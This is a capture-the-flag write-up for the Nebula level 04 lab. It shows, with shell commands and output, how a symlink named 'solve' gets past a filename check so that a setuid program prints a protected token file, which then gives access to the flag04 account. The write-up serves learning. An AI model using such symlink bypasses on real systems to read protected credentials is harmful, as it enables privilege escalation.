# Challenge
Bypass the checks in the given program

Challenge Link: https://exploit.education/nebula/level-04/

# Solution
Looking at the provided source code there are a number of checks: 
1. It checks that we've provided an argument. If not, it prints out a help message.
2. It checks if "token" is in the name of the argument provided. If so, the programs fails with the message "You may not access *filename*."
3. It checks if it can open the file. If not, the program fails with the message "Unable to open *filename*."
4. Finally, it checks if it can read the file. If not, the program fails with the message "Unable to read *filename*."

Why does this matter? Looking in the `/home/flag04` directory we see a file called `token`. Presumably, we need the contents of this file to solve level04. However, the program refuses to read the file because of check 2 and we can't accessthe file due to permissions.
```shell
level04@nebula:~$ ls /home/flag04/
flag04 token
level04@nebula:~$ /home/flag04/flag04 /home/flag04/token
You may not access `/home/flag04/token'
level04@nebula:~$ cat /home/flag04/token
cat: /home/flag04/token: Permission denied
level04@nebula:~$ cp /home/flag04/token /home/flag04/test
cp: cannot open `/home/flag04/token' for reading: Permission denied
level
```

The solution is to create a symbolic link to the token file with a name that doesn't include 'token.' This bypasses the second check since the argument we're providing doesn't have 'token' in it but actually points to the token file we are interested in.
```shell
level04@nebula:~$ ln -s /home/flag04/token solve
level04@nebula:~$ /home/flag04/flag04 solve
06508b5e-8909-4f38-b630-fdb148a848a2
```

We can use the output to login in to the flag04 user and solve level04.
```shell
level04@nebula:~$ su - level04
Password:
flag04@nebula:~$ getflag
You have sucessfully executed getflag on a target account
```

Success! We have solved level04.

# Further Reading
For more information on symbolic links, here's an article from Red Hat: [Hard links and soft links in Linux explained](https://www.redhat.com/sysadmin/linking-linux-explained)
